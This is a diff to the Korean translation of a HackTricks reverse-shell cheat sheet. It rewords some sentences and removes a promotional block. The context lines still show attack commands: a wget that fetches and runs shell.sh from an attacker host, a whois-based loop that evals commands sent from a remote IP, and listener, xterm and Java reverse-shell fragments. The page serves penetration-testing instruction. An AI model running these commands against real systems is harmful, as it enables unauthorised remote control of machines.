@@ -15,15 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-**이 쉘에 대한 질문이 있으면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인할 수 있습니다.**
+**이 쉘에 대한 질문이 있으면** [**https://explainshell.com/**](https://explainshell.com) **를 확인할 수 있습니다.**
 
 ## Full TTY
 
@@ -68,7 +60,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Linux 기반 웹 애플리케이션 내에서 **Remote Code Execution (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것은 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 보다 효과적으로 상호작용하기 위해 PTY (Pseudo Terminal) 셸을 설정하는 대안적 접근 방식이 필요합니다.
+Linux 기반 웹 애플리케이션 내에서 **Remote Code Execution (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것이 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 보다 효과적으로 상호작용하기 위해 PTY (Pseudo Terminal) 셸을 설정하는 대안적 접근 방식이 필요합니다.
 
 이 목적을 위해 추천되는 도구는 [toboggan](https://github.com/n3rada/toboggan.git)으로, 이는 대상 환경과의 상호작용을 단순화합니다.
 
@@ -141,7 +133,7 @@ while true; do nc -l <port>; done
 ```
 명령을 보내려면 입력하고 Enter를 누른 다음 CTRL+D를 눌러 STDIN을 중지합니다.
 
-**희생자**
+**Victim**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -317,7 +309,7 @@ close(Service)
 ```bash
 xterm -display 10.0.0.1:1
 ```
-역방향 셸을 잡기 위해 사용할 수 있는 것(포트 6001에서 수신 대기):
+역방향 셸을 잡기 위해 사용할 수 있는 것은 (포트 6001에서 수신 대기할 것입니다):
 ```bash
 # Authorize host
 xhost +targetip
@@ -340,12 +332,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
 AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -356,7 +342,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
